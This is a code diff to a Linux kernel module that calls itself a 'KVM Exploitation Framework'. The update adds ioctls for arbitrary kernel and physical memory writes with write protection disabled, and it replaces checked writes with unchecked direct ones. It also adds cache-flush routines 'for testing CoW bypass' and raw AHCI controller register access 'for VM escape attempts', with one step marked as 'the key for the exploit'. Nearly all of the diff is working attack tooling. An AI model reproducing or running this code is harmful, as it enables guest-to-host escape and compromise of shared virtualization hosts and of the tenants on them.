@@ -26,6 +26,7 @@
 #include <linux/version.h>
 #include <linux/highmem.h>
 #include <linux/pfn.h>
+#include <linux/smp.h>
 #include <asm/io.h>
 
 /* x86-specific includes */
@@ -47,7 +48,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("KVM Exploitation Framework");
 MODULE_DESCRIPTION("Step-by-step KVM exploitation framework");
-MODULE_VERSION("2.0");
+MODULE_VERSION("2.1");
 
 /* ========================================================================
  * Global Variables
@@ -369,6 +370,7 @@ struct physical_mem_write {
     unsigned long phys_addr;
     unsigned long length;
     unsigned char __user *user_buffer;
+    int method;                  /* 0 = auto, 1 = ioremap, 2 = direct map, 3 = kmap */
 };
 
 /* Guest memory write request */
@@ -566,6 +568,7 @@ struct batch_addr_conv {
 #define IOCTL_COPY_KERNEL_MEM         (IOCTL_BASE + 0x27)
 #define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
 #define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)
+#define IOCTL_WRITE_PHYSICAL_DIRECT   (IOCTL_BASE + 0x2A)
 
 /* Address conversion operations (Step 4) */
 #define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
@@ -585,6 +588,18 @@ struct batch_addr_conv {
 #define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
 #define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)
 
+/* Cache Operations - for testing CoW bypass */
+#define IOCTL_WBINVD                  (IOCTL_BASE + 0x40)
+#define IOCTL_CLFLUSH                 (IOCTL_BASE + 0x41)
+#define IOCTL_WRITE_AND_FLUSH         (IOCTL_BASE + 0x42)
+
+/* AHCI Direct Access */
+#define IOCTL_AHCI_INIT               (IOCTL_BASE + 0x50)
+#define IOCTL_AHCI_READ_REG           (IOCTL_BASE + 0x51)
+#define IOCTL_AHCI_WRITE_REG          (IOCTL_BASE + 0x52)
+#define IOCTL_AHCI_SET_FIS_BASE       (IOCTL_BASE + 0x53)
+#define IOCTL_AHCI_INFO               (IOCTL_BASE + 0x54)
+
 /* ========================================================================
  * Symbol Database Initialization
  * ======================================================================== */
@@ -597,8 +612,6 @@ static int init_symbol_database(void)
     for (i = 0; kvm_symbols[i].name != NULL; i++) {
         kvm_symbols[i].address = lookup_kernel_symbol(kvm_symbols[i].name);
         if (kvm_symbols[i].address) {
-            printk(KERN_INFO "%s: Found %s at 0x%lx\n",
-                   DRIVER_NAME, kvm_symbols[i].name, kvm_symbols[i].address);
             kvm_symbol_count++;
         }
     }
@@ -606,19 +619,11 @@ static int init_symbol_database(void)
     /* Initialize VMX handlers */
     for (i = 0; vmx_handlers[i].name != NULL; i++) {
         vmx_handlers[i].address = lookup_kernel_symbol(vmx_handlers[i].name);
-        if (vmx_handlers[i].address) {
-            printk(KERN_INFO "%s: VMX handler %s at 0x%lx\n",
-                   DRIVER_NAME, vmx_handlers[i].name, vmx_handlers[i].address);
-        }
     }
 
     /* Initialize SVM handlers */
     for (i = 0; svm_handlers[i].name != NULL; i++) {
         svm_handlers[i].address = lookup_kernel_symbol(svm_handlers[i].name);
-        if (svm_handlers[i].address) {
-            printk(KERN_INFO "%s: SVM handler %s at 0x%lx\n",
-                   DRIVER_NAME, svm_handlers[i].name, svm_handlers[i].address);
-        }
     }
 
     printk(KERN_INFO "%s: Loaded %d KVM symbols\n", DRIVER_NAME, kvm_symbol_count);
@@ -1070,7 +1075,7 @@ static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dum
 }
 
 /* ========================================================================
- * Memory Write Implementations (Step 3)
+ * Memory Write Implementations (Step 3) - FIXED
  * ======================================================================== */
 
 /* Write to kernel memory - handles write protection bypass */
@@ -1078,7 +1083,7 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
                                 size_t size, int do_disable_wp)
 {
     unsigned long orig_cr0 = 0;
-    long ret = 0;
+    int ret = 0;
     size_t i;
 
     if (!is_kernel_address(addr)) {
@@ -1114,19 +1119,12 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
     /* For other kernel addresses, try to write byte by byte */
     for (i = 0; i < size; i++) {
         unsigned char *ptr = (unsigned char *)addr + i;
-        if (get_kernel_nofault(ptr, buffer[i]))
-            break;
-    }
-    
-    if (i < size) {
-        ret = -EFAULT;
-        goto cleanup;
+        *ptr = buffer[i];  /* Direct write with WP disabled */
     }
 
 success:
     ret = 0;
 
-cleanup:
 #ifdef CONFIG_X86
     if (do_disable_wp) {
         /* Restore write protection */
@@ -1134,21 +1132,76 @@ cleanup:
     }
 #endif
 
-    if (ret) {
-        printk(KERN_DEBUG "%s: write_kernel_memory failed at 0x%lx\n",
-               DRIVER_NAME, addr);
-        return -EFAULT;
-    }
-
     printk(KERN_INFO "%s: Wrote %zu bytes to kernel address 0x%lx\n",
            DRIVER_NAME, size, addr);
+
+    return ret;
+}
+
+/*
+ * Write to physical memory using direct map (__va)
+ * This is the PREFERRED method for RAM addresses
+ */
+static int write_physical_direct(unsigned long phys_addr, const unsigned char *buffer, size_t size)
+{
+    void *virt_addr;
+    size_t remaining = size;
+    size_t written = 0;
+    unsigned long offset;
+    size_t chunk_size;
+    unsigned long orig_cr0 = 0;
+
+    printk(KERN_INFO "%s: write_physical_direct: phys=0x%lx size=%zu\n",
+           DRIVER_NAME, phys_addr, size);
+
+#ifdef CONFIG_X86
+    /* Disable write protection in case the page is read-only mapped */
+    orig_cr0 = disable_wp();
+#endif
+
+    while (remaining > 0) {
+        offset = phys_addr & ~PAGE_MASK;
+        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
+
+        /* Convert physical to virtual using kernel direct map */
+#ifdef CONFIG_X86
+        virt_addr = __va(phys_addr);
+#else
+        virt_addr = phys_to_virt(phys_addr);
+#endif
+
+        /* Check if the virtual address is valid */
+        if (!virt_addr_valid((unsigned long)virt_addr)) {
+            printk(KERN_WARNING "%s: __va(0x%lx) = %p is not valid, trying alternatives\n",
+                   DRIVER_NAME, phys_addr, virt_addr);
+            
+#ifdef CONFIG_X86
+            restore_wp(orig_cr0);
+#endif
+            return written > 0 ? 0 : -EFAULT;
+        }
+
+        /* Perform the write */
+        memcpy(virt_addr, buffer + written, chunk_size);
+
+        written += chunk_size;
+        phys_addr += chunk_size;
+        remaining -= chunk_size;
+    }
+
+#ifdef CONFIG_X86
+    restore_wp(orig_cr0);
+#endif
+
+    printk(KERN_INFO "%s: Direct write successful: %zu bytes to physical 0x%lx\n",
+           DRIVER_NAME, size, phys_addr - size);
 
     return 0;
 }
 
-/* Write to physical memory using ioremap */
-static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer,
-                                  size_t size)
+/* Write to physical memory using ioremap (for MMIO, not RAM) */
+static int write_physical_ioremap(unsigned long phys_addr, const unsigned char *buffer,
+                                   size_t size)
 {
     void __iomem *mapped;
     unsigned long offset;
@@ -1156,13 +1209,16 @@ static int write_physical_memory(unsigned long phys_addr, const unsigned char *b
     size_t remaining = size;
     size_t written = 0;
 
+    printk(KERN_INFO "%s: write_physical_ioremap: phys=0x%lx size=%zu\n",
+           DRIVER_NAME, phys_addr, size);
+
     while (remaining > 0) {
         offset = phys_addr & ~PAGE_MASK;
         chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
 
         mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
         if (!mapped) {
-            printk(KERN_DEBUG "%s: ioremap failed for phys write 0x%lx\n",
+            printk(KERN_WARNING "%s: ioremap failed for phys 0x%lx (this is expected for RAM)\n",
                    DRIVER_NAME, phys_addr);
             return written > 0 ? 0 : -EFAULT;
         }
@@ -1175,7 +1231,7 @@ static int write_physical_memory(unsigned long phys_addr, const unsigned char *b
         remaining -= chunk_size;
     }
 
-    printk(KERN_INFO "%s: Wrote %zu bytes to physical address 0x%lx\n",
+    printk(KERN_INFO "%s: ioremap write successful: %zu bytes to physical 0x%lx\n",
            DRIVER_NAME, size, phys_addr - size);
 
     return 0;
@@ -1192,19 +1248,24 @@ static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *
     size_t to_copy;
     size_t written = 0;
 
+    printk(KERN_INFO "%s: write_physical_via_pfn: phys=0x%lx pfn=0x%lx size=%zu\n",
+           DRIVER_NAME, phys_addr, pfn, size);
+
     while (written < size) {
         if (!pfn_valid(pfn)) {
-            printk(KERN_DEBUG "%s: Invalid PFN for write: 0x%lx\n", DRIVER_NAME, pfn);
+            printk(KERN_WARNING "%s: PFN 0x%lx is not valid (outside RAM?)\n", DRIVER_NAME, pfn);
             return written > 0 ? 0 : -EINVAL;
         }
 
         page = pfn_to_page(pfn);
         if (!page) {
+            printk(KERN_WARNING "%s: pfn_to_page(0x%lx) returned NULL\n", DRIVER_NAME, pfn);
             return written > 0 ? 0 : -EFAULT;
         }
 
         kaddr = kmap_atomic(page);
         if (!kaddr) {
+            printk(KERN_WARNING "%s: kmap_atomic failed for PFN 0x%lx\n", DRIVER_NAME, pfn);
             return written > 0 ? 0 : -ENOMEM;
         }
 
@@ -1217,10 +1278,71 @@ static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *
         offset = 0;
     }
 
-    printk(KERN_INFO "%s: Wrote %zu bytes via PFN to physical 0x%lx\n",
+    printk(KERN_INFO "%s: PFN write successful: %zu bytes to physical 0x%lx\n",
            DRIVER_NAME, size, phys_addr);
 
     return 0;
+}
+
+/*
+ * Smart physical memory write - tries multiple methods
+ * Method selection:
+ *   0 = auto (try direct map first, then kmap, then ioremap)
+ *   1 = ioremap only (for MMIO)
+ *   2 = direct map only (__va)
+ *   3 = kmap only (via PFN)
+ */
+static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer,
+                                  size_t size, int method)
+{
+    int ret;
+    unsigned long pfn = phys_addr >> PAGE_SHIFT;
+
+    printk(KERN_INFO "%s: write_physical_memory: phys=0x%lx size=%zu method=%d\n",
+           DRIVER_NAME, phys_addr, size, method);
+
+    /* Method 1: ioremap only (for MMIO regions) */
+    if (method == 1) {
+        return write_physical_ioremap(phys_addr, buffer, size);
+    }
+
+    /* Method 2: direct map only */
+    if (method == 2) {
+        return write_physical_direct(phys_addr, buffer, size);
+    }
+
+    /* Method 3: kmap only */
+    if (method == 3) {
+        return write_physical_via_pfn(phys_addr, buffer, size);
+    }
+
+    /* Method 0: Auto - try in order of preference for RAM */
+    
+    /* First, try direct map - fastest and most reliable for RAM */
+    ret = write_physical_direct(phys_addr, buffer, size);
+    if (ret == 0) {
+        return 0;
+    }
+    printk(KERN_INFO "%s: Direct map failed, trying kmap...\n", DRIVER_NAME);
+
+    /* Second, try kmap if PFN is valid */
+    if (pfn_valid(pfn)) {
+        ret = write_physical_via_pfn(phys_addr, buffer, size);
+        if (ret == 0) {
+            return 0;
+        }
+        printk(KERN_INFO "%s: kmap failed, trying ioremap...\n", DRIVER_NAME);
+    }
+
+    /* Last resort: ioremap (usually fails for RAM) */
+    ret = write_physical_ioremap(phys_addr, buffer, size);
+    if (ret == 0) {
+        return 0;
+    }
+
+    printk(KERN_ERR "%s: All write methods failed for physical 0x%lx\n",
+           DRIVER_NAME, phys_addr);
+    return -EFAULT;
 }
 
 /* Write to guest memory - for guest-to-host scenarios */
@@ -1239,7 +1361,7 @@ static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer
     printk(KERN_INFO "%s: Writing to guest GPA 0x%lx (size: %zu)\n",
            DRIVER_NAME, gpa, size);
 
-    return write_physical_memory(gpa, buffer, size);
+    return write_physical_memory(gpa, buffer, size, 0);
 }
 
 /* Write to guest memory via GFN */
@@ -1249,6 +1371,212 @@ static int write_guest_memory_gfn(unsigned long gfn, const unsigned char *buffer
     unsigned long gpa = gfn << PAGE_SHIFT;
     return write_guest_memory_gpa(gpa, buffer, size);
 }
+
+/* ========================================================================
+ * Cache Operations - for testing CoW bypass
+ * ======================================================================== */
+
+/* WBINVD on a single CPU */
+static void do_wbinvd(void *info)
+{
+    asm volatile("wbinvd" ::: "memory");
+}
+
+/* Execute WBINVD on all CPUs */
+static void wbinvd_all_cpus(void)
+{
+    printk(KERN_INFO "%s: Executing WBINVD on all CPUs\n", DRIVER_NAME);
+    on_each_cpu(do_wbinvd, NULL, 1);
+    printk(KERN_INFO "%s: WBINVD complete on all CPUs\n", DRIVER_NAME);
+}
+
+/* CLFLUSH on a specific virtual address */
+static void clflush_addr(void *addr)
+{
+    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
+}
+
+/* CLFLUSHOPT on a specific virtual address (if available) */
+static void clflushopt_addr(void *addr)
+{
+    asm volatile("clflushopt (%0)" :: "r"(addr) : "memory");
+}
+
+/* Memory fence */
+static void do_mfence(void)
+{
+    asm volatile("mfence" ::: "memory");
+}
+
+/* SFENCE - store fence */
+static void do_sfence(void)
+{
+    asm volatile("sfence" ::: "memory");
+}
+
+/* Write to physical memory with cache flush */
+static int write_physical_and_flush(unsigned long phys_addr, const unsigned char *buffer,
+                                     size_t size)
+{
+    void *virt_addr;
+    int ret;
+    unsigned long orig_cr0 = 0;
+
+    printk(KERN_INFO "%s: write_physical_and_flush: phys=0x%lx size=%zu\n",
+           DRIVER_NAME, phys_addr, size);
+
+    /* Get virtual address */
+    virt_addr = __va(phys_addr);
+    
+    if (!virt_addr_valid((unsigned long)virt_addr)) {
+        printk(KERN_WARNING "%s: Virtual address %p not valid\n", DRIVER_NAME, virt_addr);
+        return -EFAULT;
+    }
+
+    /* Disable write protection */
+    orig_cr0 = disable_wp();
+
+    /* Perform the write */
+    memcpy(virt_addr, buffer, size);
+
+    /* Memory barrier before flush */
+    do_mfence();
+
+    /* Flush the specific cache line */
+    clflush_addr(virt_addr);
+
+    /* Store fence to ensure flush completes */
+    do_sfence();
+
+    /* Another memory barrier */
+    do_mfence();
+
+    /* WBINVD on all CPUs for extra certainty */
+    wbinvd_all_cpus();
+
+    /* Restore write protection */
+    restore_wp(orig_cr0);
+
+    printk(KERN_INFO "%s: Write + flush complete for phys 0x%lx\n",
+           DRIVER_NAME, phys_addr);
+
+    return 0;
+}
+
+/* CLFLUSH request structure */
+struct clflush_request {
+    uint64_t virt_addr;
+    uint64_t phys_addr;
+    int use_phys;
+};
+
+/* Write and flush request structure */
+struct write_flush_request {
+    uint64_t phys_addr;
+    uint64_t buffer;
+    uint64_t size;
+};
+
+/* ========================================================================
+ * AHCI Direct Access (for VM escape attempts)
+ * ======================================================================== */
+
+#define AHCI_MMIO_BASE  0xfea0e000
+#define AHCI_MMIO_SIZE  0x1000
+
+/* AHCI Port registers */
+#define AHCI_PORT_BASE(p) (0x100 + (p) * 0x80)
+#define PORT_CLB        0x00
+#define PORT_CLB_HI     0x04
+#define PORT_FB         0x08
+#define PORT_FB_HI      0x0C
+#define PORT_IS         0x10
+#define PORT_CMD        0x18
+#define PORT_SSTS       0x28
+#define PORT_CI         0x38
+
+static void __iomem *ahci_mmio = NULL;
+
+static int ahci_map_mmio(void)
+{
+    if (ahci_mmio)
+        return 0;  /* Already mapped */
+    
+    ahci_mmio = ioremap(AHCI_MMIO_BASE, AHCI_MMIO_SIZE);
+    if (!ahci_mmio) {
+        printk(KERN_ERR "%s: Failed to ioremap AHCI MMIO\n", DRIVER_NAME);
+        return -ENOMEM;
+    }
+    
+    printk(KERN_INFO "%s: AHCI MMIO mapped at %p\n", DRIVER_NAME, ahci_mmio);
+    return 0;
+}
+
+static void ahci_unmap_mmio(void)
+{
+    if (ahci_mmio) {
+        iounmap(ahci_mmio);
+        ahci_mmio = NULL;
+    }
+}
+
+static u32 ahci_read32(u32 offset)
+{
+    if (!ahci_mmio)
+        return 0;
+    return readl(ahci_mmio + offset);
+}
+
+static void ahci_write32(u32 offset, u32 value)
+{
+    if (!ahci_mmio)
+        return;
+    writel(value, ahci_mmio + offset);
+}
+
+/* Set FIS base address for a port */
+static void ahci_set_fis_base(int port, u64 phys_addr)
+{
+    u32 port_base = AHCI_PORT_BASE(port);
+    
+    printk(KERN_INFO "%s: Setting port %d FIS base to 0x%llx\n", 
+           DRIVER_NAME, port, phys_addr);
+    
+    ahci_write32(port_base + PORT_FB, phys_addr & 0xffffffff);
+    ahci_write32(port_base + PORT_FB_HI, phys_addr >> 32);
+}
+
+/* Set command list base address for a port */
+static void ahci_set_clb(int port, u64 phys_addr)
+{
+    u32 port_base = AHCI_PORT_BASE(port);
+    
+    printk(KERN_INFO "%s: Setting port %d CLB to 0x%llx\n", 
+           DRIVER_NAME, port, phys_addr);
+    
+    ahci_write32(port_base + PORT_CLB, phys_addr & 0xffffffff);
+    ahci_write32(port_base + PORT_CLB_HI, phys_addr >> 32);
+}
+
+/* Get port status */
+static u32 ahci_get_port_status(int port)
+{
+    return ahci_read32(AHCI_PORT_BASE(port) + PORT_SSTS);
+}
+
+/* AHCI request structures */
+struct ahci_reg_request {
+    u32 port;
+    u32 offset;
+    u32 value;
+    int is_write;
+};
+
+struct ahci_fis_request {
+    u32 port;
+    u64 fis_base;
+    u64 clb_base;
+};
 
 #ifdef CONFIG_X86
 /* Write MSR */
@@ -1347,7 +1675,7 @@ static int memset_physical_memory(unsigned long phys_addr, unsigned char value, 
     }
 
     memset(buffer, value, size);
-    ret = write_physical_memory(phys_addr, buffer, size);
+    ret = write_physical_memory(phys_addr, buffer, size, 0);
     kfree(buffer);
 
     return ret;
@@ -1396,7 +1724,7 @@ static int patch_memory(unsigned long addr, const unsigned char *original,
     if (addr_type == 0) {
         ret = write_kernel_memory(addr, patch, length, 1);
     } else {
-        ret = write_physical_memory(addr, patch, length);
+        ret = write_physical_memory(addr, patch, length, 0);
     }
 
     kfree(current_bytes);
@@ -2294,7 +2622,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
                 return -EFAULT;
             }
 
-            ret = write_physical_memory(req.phys_addr, kbuf, req.length);
+            ret = write_physical_memory(req.phys_addr, kbuf, req.length, req.method);
             kfree(kbuf);
             return ret;
         }
@@ -2327,6 +2655,38 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             }
 
             ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
+            kfree(kbuf);
+            return ret;
+        }
+
+        case IOCTL_WRITE_PHYSICAL_DIRECT: {
+            struct physical_mem_write req;
+            unsigned char *kbuf;
+            int ret;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.length || !req.user_buffer) {
+                return -EINVAL;
+            }
+
+            if (req.length > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            kbuf = kmalloc(req.length, GFP_KERNEL);
+            if (!kbuf) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
+                kfree(kbuf);
+                return -EFAULT;
+            }
+
+            ret = write_physical_direct(req.phys_addr, kbuf, req.length);
             kfree(kbuf);
             return ret;
         }
@@ -2715,6 +3075,169 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
         }
 
+        /* Cache Operations */
+        case IOCTL_WBINVD: {
+            printk(KERN_INFO "%s: IOCTL_WBINVD - flushing all caches\n", DRIVER_NAME);
+            wbinvd_all_cpus();
+            return 0;
+        }
+
+        case IOCTL_CLFLUSH: {
+            struct clflush_request req;
+            void *addr;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (req.use_phys) {
+                addr = __va(req.phys_addr);
+            } else {
+                addr = (void *)req.virt_addr;
+            }
+
+            printk(KERN_INFO "%s: IOCTL_CLFLUSH - flushing addr %p\n", DRIVER_NAME, addr);
+            
+            if (virt_addr_valid((unsigned long)addr)) {
+                clflush_addr(addr);
+                do_mfence();
+            } else {
+                printk(KERN_WARNING "%s: Address %p not valid for CLFLUSH\n", DRIVER_NAME, addr);
+                return -EFAULT;
+            }
+            
+            return 0;
+        }
+
+        case IOCTL_WRITE_AND_FLUSH: {
+            struct write_flush_request req;
+            unsigned char *kbuf;
+            int ret;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.size || !req.buffer || req.size > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            kbuf = kmalloc(req.size, GFP_KERNEL);
+            if (!kbuf) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(kbuf, (void __user *)req.buffer, req.size)) {
+                kfree(kbuf);
+                return -EFAULT;
+            }
+
+            ret = write_physical_and_flush(req.phys_addr, kbuf, req.size);
+            kfree(kbuf);
+            return ret;
+        }
+
+        /* AHCI Direct Access */
+        case IOCTL_AHCI_INIT: {
+            return ahci_map_mmio();
+        }
+
+        case IOCTL_AHCI_READ_REG: {
+            struct ahci_reg_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            if (req.port < 6) {
+                req.value = ahci_read32(AHCI_PORT_BASE(req.port) + req.offset);
+            } else {
+                req.value = ahci_read32(req.offset);
+            }
+
+            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
+        }
+
+        case IOCTL_AHCI_WRITE_REG: {
+            struct ahci_reg_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            if (req.port < 6) {
+                ahci_write32(AHCI_PORT_BASE(req.port) + req.offset, req.value);
+            } else {
+                ahci_write32(req.offset, req.value);
+            }
+
+            printk(KERN_INFO "%s: AHCI write port %d offset 0x%x = 0x%x\n",
+                   DRIVER_NAME, req.port, req.offset, req.value);
+            return 0;
+        }
+
+        case IOCTL_AHCI_SET_FIS_BASE: {
+            struct ahci_fis_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            if (req.port >= 6) {
+                return -EINVAL;
+            }
+
+            /* Set FIS base - this is the key for the exploit! */
+            ahci_set_fis_base(req.port, req.fis_base);
+            
+            if (req.clb_base) {
+                ahci_set_clb(req.port, req.clb_base);
+            }
+
+            return 0;
+        }
+
+        case IOCTL_AHCI_INFO: {
+            u32 cap, ghc, pi, vs;
+            struct {
+                u32 cap;
+                u32 ghc;
+                u32 pi;
+                u32 vs;
+                u32 port_ssts[6];
+            } info;
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            info.cap = ahci_read32(0x00);
+            info.ghc = ahci_read32(0x04);
+            info.pi = ahci_read32(0x0C);
+            info.vs = ahci_read32(0x10);
+
+            for (int i = 0; i < 6; i++) {
+                info.port_ssts[i] = ahci_get_port_status(i);
+            }
+
+            printk(KERN_INFO "%s: AHCI CAP=0x%x GHC=0x%x PI=0x%x VS=0x%x\n",
+                   DRIVER_NAME, info.cap, info.ghc, info.pi, info.vs);
+
+            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
+        }
+
         default:
             return -ENOTTY;
     }
@@ -2728,13 +3251,11 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 
 static int driver_open(struct inode *inode, struct file *file)
 {
-    printk(KERN_DEBUG "%s: Device opened\n", DRIVER_NAME);
     return 0;
 }
 
 static int driver_release(struct inode *inode, struct file *file)
 {
-    printk(KERN_DEBUG "%s: Device closed\n", DRIVER_NAME);
     return 0;
 }
 
@@ -2754,7 +3275,7 @@ static int __init mod_init(void)
 {
     int ret;
 
-    printk(KERN_INFO "%s: Initializing KVM Probe Framework v2.0\n", DRIVER_NAME);
+    printk(KERN_INFO "%s: Initializing KVM Probe Framework v2.1\n", DRIVER_NAME);
 
     /* Initialize kallsyms lookup for newer kernels */
     ret = kallsyms_lookup_init();
@@ -2813,6 +3334,9 @@ static int __init mod_init(void)
 static void __exit mod_exit(void)
 {
     printk(KERN_INFO "%s: Unloading KVM Probe Framework\n", DRIVER_NAME);
+
+    /* Cleanup AHCI mapping */
+    ahci_unmap_mmio();
 
     if (driver_device) {
         device_destroy(driver_class, MKDEV(major_num, 0));
